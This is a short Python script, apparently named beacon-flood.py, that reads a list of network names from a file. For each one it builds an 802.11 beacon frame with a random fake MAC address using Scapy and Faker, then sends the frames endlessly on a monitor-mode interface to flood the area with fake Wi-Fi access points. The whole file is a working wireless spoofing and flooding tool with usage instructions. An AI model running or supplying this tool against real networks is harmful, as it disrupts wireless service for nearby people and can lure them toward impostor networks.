from scapy.all import *
import sys
import random
import os
from faker import Faker

# How to use
def usage():
    print("syntax : python3 beacon-flood.py <interface> <ssid-list-file>")
    print("sample : python3 beacon-flood.py mon0 ssid-list.txt")


def ssid_list():
    with open(sys.argv[2],'r') as f:
        ssids = f.readlines()
    ssids = [line.strip() for line in ssids]
    return ssids

# def ssid_list():
#     f = open(sys.argv[2],'r')
#     ssid = []
#     while True:
#         line = f.readline()
#         if not line: 
#             break
#         ssid.append(line)
#     f.close()
#     return ssid

    
def make_frame(ssids):
    frames =[]
    faker = Faker()

    for netSSID in ssids:
        sender = faker.mac_address()
        dot11 = Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff',addr2=sender, addr3=sender)
        beacon = Dot11Beacon(cap='ESS+privacy')
        netSSID_encoding = netSSID.encode('utf-8')
        essid = Dot11Elt(ID='SSID',info=netSSID_encoding, len=len(netSSID_encoding))
        #essid = Dot11Elt(ID='SSID',info=netSSID, len=len(netSSID))
        frame = RadioTap()/dot11/beacon/essid
        frames.append(frame)
        print("---------------------------------------------------------------------------------------")
        print("SSID="+netSSID+" :",end=' ')
        print("add1="+frame.addr1,end=' | ')
        print("add2="+frame.addr2,end=' | ')
        print("add3="+frame.addr3)
    print("---------------------------------------------------------------------------------------")

    return frames


# Check Parameter
if len(sys.argv) != 3:
    usage()
    sys.exit()

# Read file for make ssid list
ssids = ssid_list()

# Set Interface
iface = sys.argv[1]

# Make Beacon Frame
frames = make_frame(ssids)

# Beacon Flooding
sendp(frames, iface=iface, inter=0.0100, loop=1,verbose=0)
